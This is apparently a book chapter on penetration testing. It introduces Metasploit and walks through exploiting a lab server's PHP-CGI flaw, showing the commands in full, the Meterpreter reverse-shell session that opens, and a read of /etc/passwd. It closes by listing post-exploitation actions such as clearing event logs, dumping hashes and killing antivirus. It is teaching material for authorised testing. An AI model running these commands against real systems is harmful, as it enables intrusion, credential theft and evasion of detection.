
## Getting started with Metasploit

Metasploit is a powerful framework used to test exploits against target hosts. Metasploit is far and away the de facto standard in exploit testing. We will be using the information we gleaned from our OpenVAS scans to try and exploit the systems to verify whether or not they are truly vulnerable to those vulnerabilities that were found. I will then take the results that I obtain from my tests and include them in the penetration report. This way the management and stakeholders involved within the company can patch the vulnerabilities if patches are available or created with the necessary compensating controls.

Metasploit has four versions that are currently available: the community version, the express version, the ultimate version, and the pro version. The community version is free but has limitations because it’s free. The other versions increase in cost as more features and abilities are added. Here is a great breakdown of the features between the versions from Rapid7, which is the company that acquired the Metasploit framework back in 2009:

```
https://help.rapid7.com/metasploit/Content/getting-started/product-editions.html
```

I am going to use the community edition in all my tests, since it is free to use, and it allows anyone who wants to follow along with the examples in this book.

The Metasploit framework is based on modules. You use these modules to perform your various tasks against your targets. These modules include the following:

- **Exploits**: These are code that will try to take advantage of a known vulnerability on the system.
- **Payload**: These are code that will leave something behind on the remote system.
- **Encoders**: These help to get the payloads onto the remote system by helping bypass any obstacles in its way.
- **Nops**: This stands for no operations. With the x86 architecture, it really means to do nothing for one cycle. This allows Metasploit to keep the payload size consistent.
- **Post**: These are modules that we can use after the system has been compromised.
- **Auxiliary**: These are other modules that just don’t fit in the preceding categories. If you do a show auxiliary from the msfconsole, you can see the various categories such as scanners and fuzzers.

I will be using some of these modules within Metasploit to try and gain access to my remote target.

## Exploiting our targets with Metasploit

Now, it is time to try and exploit some of the targets we found during our vulnerability scans. This is where `msfconsole` will become our new best friend. Msfconsole is the single pane of glass/centralized console for Metasploit. It's my favorite way to use Metasploit, since it is one of the few ways by which we can access most of the features contained in the product.

To launch `msfconsole`, just open up a Terminal window and type `msfconsole --help`. Now, there are a bunch of options you can pass when starting `msfconsole`. Here is a screenshot of these options:

![](img/095df2cd1930baecbcecaa51ee3417aa_94_0.png)

However, for my tests, we are just going to run the command without any additional options. To do this, just run `msfconsole` from the command line, and you should get to the `msf` prompt:

![](img/095df2cd1930baecbcecaa51ee3417aa_95_0.png)

Once inside `msfconsole`, it can definitely be intimidating. Running the `help` command will display all the options you have. There are a lot of great things in there, but where do you start? The first thing I do is run `show exploits`. This way, I can see all the exploits that are available to me. I want to see if any of them will match what I found in the vulnerability scan.

The first thing I noticed on my vulnerability report was a PHP-CGI issue with my target server. To see if anything comes up in Metasploit, I log into `msfconsole` and do a search for any `php-cgi` exploits. Luckily, one does come up. The following screenshot shows this search:

![](img/095df2cd1930baecbcecaa51ee3417aa_95_1.png)

Since I want to do my due diligence in the exploit report, I look at the links found within the References section of the report. I want to verify that my exploit in the msfconsole matches that of the vulnerability report. Upon looking at http://www.kb.cert.org/vuls, I can see that it has the same disclosure date as shown in my msfconsole. This information is enough for me to want to proceed and verify the vulnerability:

![](img/095df2cd1930baecbcecaa51ee3417aa_96_0.png)

Since I now know I have the exploit I want to use, I just need to tell my msfconsole to use that particular exploit. It is a pretty straightforward process to load the exploit.

Using the keyword use and the exploit string, my prompt should change the exploit as follows:

```
msf > use exploit/multi/http/php_cgi_arg_injection
msf exploit(php_cgi_arg_injection) >
```

Now before I actively try the exploit, I have to specify the target host. Using the show options command, I can see what options are currently set. In my case, my RHOST is blank. This is not a problem at all, as I will just specify my host, which is the host that we ran our vulnerability scan against. I will use the set RHOST command:

```
set RHOST 192.168.87.130
```

The following screenshot shows the process in my lab:

![](img/095df2cd1930baecbcecaa51ee3417aa_97_0.png)

Now that the exploit is loaded, and I have my options set, it's time to try and exploit. This is the fun part. Running the exploit against your host is done with the exploit command:

```
msf exploit(php_cgi_arg_injection) > exploit
```

Once I hit Enter, Metasploit goes ahead and tries to exploit the target host with the specified exploit. It can take some time, but it is worth the wait:

```
msf exploit/php_cgi_arg_injection > exploit
[*] Started reverse TCP handler on 192.168.87.129:4444
[*] Sending stage (34122 bytes) to 192.168.87.130
[*] Meterpreter session 1 opened (192.168.87.129:4444 -> 192.168.87.130:33595) at 2017-01-27 10:15:00 -0500

meterpreter >
```

You can see here that our exploit was successful. We are at the meterpreter prompt now.

Meterpreter is basically a dynamic payload that uses an in-memory injection, an interactive shell per se. This all happens over a network connection that was set up during the exploit. From here, you can do a lot of different things to the compromised system. What options you will have available to you depend on the type of compromised system you have now owned. Typically, you have the following commands based on the following categories:

- Core commands
- File commands
- Networking commands
- Filesystem commands
- User interface commands
- Webcam commands
- Elevate commands
- Password database commands
- Time stomp commands

Meterpreter typically remains unnoticed by network-based IDS systems, as well as host-based IDS systems. This makes it a great tool to run tasks on remote computers, while staying hidden.

Now, let's see what information we can get. I will try and grab the passwd file, as that always has some great information in it, and we will need it in the coming days for some password attacks:

```
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
```

After this, I can also see what user I am running as on the exploited system:

```
meterpreter > getuid
Server username: www-data (33)
```

Based on this information, I can clearly write up in my penetration-testing report that this host is vulnerable to that particular PHP-CGI vulnerability we found with OpenVAS and exploited via Metasploit.

![](img/095df2cd1930baecbcecaa51ee3417aa_99_0.png)

Since I am just looking to see if I can exploit the target systems, I won't be making any changes on the end system or doing anything malicious. Meterpreter lets you do pretty much anything, including uploading and downloading files. Our purpose is to just find, test, verify, and report what we find, and this is what I will be doing.

Besides the preceding example where we took the password file, you can do some of these tasks that I find very powerful:

- Grabbing a shell
- Executing a given file on the target host
- Clearing and securing remote event logs
- Uploading or downloading files to the target host
- Kill processes
- Grabbing system information
- Reading/writing/deleting files
- Running scripts created by third parties such as the following:
  - Check for VM
  - Dump the hash file
  - Kill antivirus
  - Harvest anything you may want from the target host
